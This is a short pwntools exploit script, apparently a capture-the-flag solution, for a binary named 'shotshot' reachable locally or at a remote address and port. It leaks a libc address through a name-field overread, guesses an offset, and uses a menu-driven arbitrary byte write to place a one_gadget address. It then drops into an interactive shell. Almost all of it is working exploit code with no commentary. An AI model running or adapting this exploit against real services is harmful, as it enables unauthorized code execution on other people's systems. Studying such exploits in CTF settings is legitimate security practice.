from pwn import *
import time
debug=1

#elf = ELF('./shotshot_patch_v5')

context.log_level = 'debug'
if debug:
	p= process('./shotshot')
else:
	
	p = remote('172.91.0.135', 8084)
def z(a =''):
	if debug:
		gdb.attach(p,a)



def select_shot(idx):
	p.recvuntil('exit')
	p.sendline('4')	
	p.recvuntil('3. C++')
	p.sendline(str(idx))
def write_one(where,value):
	select_shot(1)
	p.recvuntil('id:')
	p.sendline(str(where))
	select_shot(0)
	select_shot(0)
	select_shot(0)
	p.recvuntil('luckynum:')
	p.sendline(str(value))


p.recvuntil('Your name :')
p.send('a'*0x20)
p.recvuntil('Thank you ')
p.recvuntil('a'*0x20)
libc_addr = u64(p.recv(6).ljust(8,'\0'))-0x3c5540
if ((libc_addr&0xfff)!=0):
	print 'libc leak errer!!'
	exit(0)
print '[+] libc',hex(libc_addr)
print '[+] gusee',hex(libc_addr +0x5ee000)
#z()
#raw_input()
maybe = ((libc_addr +0x5ee000)>>8)&0xff
if (maybe<0x70):
	print 'bad luck'
	exit(0)

#leak here
p.recvuntil('exit')
p.sendline('1')
p.recvuntil('name:')
p.sendline(str(0x100))
p.recvuntil('name:')
p.sendline('/bin/sh\0')
#
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
target = libc_addr + one_gadget[0]

gdb.attach(p,'b *0x400bc9')
for i in range(6):
	where = 0x1000*i+0x1020+i
	value = (target >> (i*8))&0xff
	write_one(where,value)
#z('b *0x400A00\nc')	
write_one(0x1000*i+0x2000+1,maybe)

p.interactive()


